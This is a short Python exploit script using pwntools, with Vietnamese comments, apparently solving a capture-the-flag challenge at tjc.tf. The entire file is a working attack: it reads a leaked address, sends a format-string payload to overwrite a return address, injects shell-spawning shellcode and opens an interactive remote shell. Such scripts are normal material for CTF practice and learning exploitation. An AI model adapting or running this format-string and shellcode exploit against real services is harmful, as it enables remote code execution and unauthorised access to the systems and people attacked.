from pwn import *

# Set kiến trúc
context.arch = 'amd64'
#p=process("./chall")
p=remote("tjc.tf",31363)
shell_addr=int(p.recvline().strip().split(b",")[0],16)
ret_addr=shell_addr+1048
# Tạo shellcode


# In ra shellcode ở dạng byte và hex
# print(len(shellcode))
# 
# print(hex(shell_addr))
# print(hex(ret_addr))
#input()
p.recvuntil(b'exit) ')
p.sendline(b'deposit')
#input()
payload=fmtstr_payload(12, {ret_addr: shell_addr+8})
p.sendlineafter(b'Enter amount: ',payload)
#input()
p.recvuntil(b'exit) ')
p.sendline(b'deposit')
shellcode = asm(shellcraft.sh())
p.sendlineafter(b'Enter amount: ',b'a'*8+shellcode)
#p.sendline(b'exit')
p.interactive()
